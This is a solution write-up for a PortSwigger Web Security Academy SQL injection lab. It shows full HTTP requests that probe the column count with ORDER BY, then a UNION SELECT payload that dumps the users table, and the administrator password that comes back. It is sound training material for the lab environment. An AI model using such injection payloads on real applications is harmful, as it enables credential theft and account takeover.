# Lab 05: SQL injection UNION attack, retrieving data from other tables

## Description

This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you need to combine some of the techniques you learned in previous labs.

The database contains a different table called `users`, with columns called `username` and `password`.

To solve the lab, perform an [SQL injection UNION](https://portswigger.net/web-security/sql-injection/union-attacks) attack that retrieves all usernames and passwords, and use the information to log in as the `administrator` user.

---

## Solution

We are trying to read the contents of the `users` table, which contains two columns, `username` and `password`. From this we can login as the `administrator` user.

The first step is to determine how many columns are being returned by the original `SELECT` statement. Using the iterative 	`ORDER BY` method, we can see it is returning two columns.

No error:

```http
GET /filter?category=Gifts'+ORDER+BY+2-- HTTP/1.1
Host: ac061f4d1e9f5a02800e174700890095.web-security-academy.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
```

Error:

```http
GET /filter?category=Gifts'+ORDER+BY+3-- HTTP/1.1
Host: ac061f4d1e9f5a02800e174700890095.web-security-academy.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
```

Also, by looking at the different orders in which the data items are rendered on the page when using `ORDER BY 1` and `ORDER BY 2`, we can determine that the name of the product is at index 1 and its description is at index 2. Both of these columns are most likely strings, so the `UNION` operation with the presumptive string columns `username` and `password` from the `users` table will most likely be effective.

With the number of columns in hand and assuming they are both of type string, we can inject the following to dump the `users` table:

```http
GET /filter?category=Gifts'+UNION+SELECT+username,password+FROM+users-- HTTP/1.1
Host: ac061f4d1e9f5a02800e174700890095.web-security-academy.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
```

giving us the following credentials:

```html
...
<tr>
	<th>administrator</th>
	<td>wd7stpw5spiieu1vusza</td>
</tr>
...
```

These credentials can be used to login as `administrator`.